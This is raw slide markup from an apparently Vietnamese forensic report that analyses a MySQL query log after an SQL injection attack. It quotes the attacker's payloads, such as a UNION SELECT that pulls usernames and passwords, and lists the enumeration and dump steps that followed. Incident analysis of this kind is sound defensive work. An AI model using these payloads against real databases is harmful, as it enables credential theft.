              <a:t>- Truy vấn bất thường:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>	Xuất hiện lúc: 05:25:32</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="542" name="Google Shape;542;p49"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1701550" y="2484075"/>
            <a:ext cx="8258175" cy="13144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546"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="547" name="Google Shape;547;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="566100" y="4164975"/>
            <a:ext cx="10622100" cy="2287500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t> Dấu hiệu kỹ thuật:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Payload: UNION SELECT: Cho thấy đối tượng đang: ghép kết quả truy vấn giả, ép database trả dữ liệu ngoài ý muôn</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Hàm database(): được dùng để xác định tên database hiện tại.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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 Nhận định điều tra:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Đây không còn là dò lỗi đơn thuần. Đối tượng đã:</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Xác nhận SQL Injection hoạt động</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Bắt đầu enumeerate database</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>=&gt; Có thể xem đây là giai đoạn khai thác thành công.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="548" name="Google Shape;548;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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6.3.2. Chi tiết - Phân tích query.log: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="549" name="Google Shape;549;p50"/>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550" name="Google Shape;550;p50" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="328700" y="4164975"/>
            <a:ext cx="192699" cy="2567850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="551" name="Google Shape;551;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giai đoạn khai thác xác định database:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="552" name="Google Shape;552;p50" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="553" name="Google Shape;553;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="8475300" cy="5088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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Truy vấn bất thường:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>	Xuất hiện lúc: 05:25:52</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="554" name="Google Shape;554;p50"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1800449" y="2636475"/>
            <a:ext cx="8153400" cy="12001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558"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="559" name="Google Shape;559;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="308575" y="3429000"/>
            <a:ext cx="4596900" cy="3101700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Phân tích: Chuỗi truy vấn này giống hành vi của:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ mysqldump</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phpMyAdmin export</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công cụ dump dữ liệu</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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 Nhận định điều tra: Có dấu hiệu cho thấy dump:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Toàn bộ database public_service</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Bao gồm: bảng users và bảng records</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Tuy nhiên ở đây không tìm thấy file dump ở trong máy victim nên có thể attack đã dùng anti-forensic, xóa dấu vết tồn tại của file dump rồi.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="560" name="Google Shape;560;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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6.3.2. Chi tiết - Phân tích query.log: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="561" name="Google Shape;561;p51"/>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2" name="Google Shape;562;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Dấu hiệu dump database:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="563" name="Google Shape;563;p51" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="564" name="Google Shape;564;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="308575" y="1743700"/>
            <a:ext cx="4596900" cy="18345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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Dấu hiệu: Xuất hiện lúc: 05:27:02</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Liệt kê bảng: SHOW FULL TABLES</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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Đọc cấu trúc bảng: show create table users</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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Truy xuất toàn bộ dữ liệu: SELECT `id`, `username`, `password` FROM `users`</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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Khóa bảng để export: LOCK TABLES</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="565" name="Google Shape;565;p51"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect l="9314"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5152650" y="1818450"/>
            <a:ext cx="6458475" cy="47910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569"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="570" name="Google Shape;570;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="566100" y="4164975"/>
            <a:ext cx="5083500" cy="2568000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t> Dấu hiệu rõ ràng của hành vi đánh cắp dữ liệu:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Payload: UNION SELECT username,password FROM users</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Cho thấy: đối tượng cố ý truy xuất: từ bảng users</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username</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password</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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 Nhận định điều tra:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
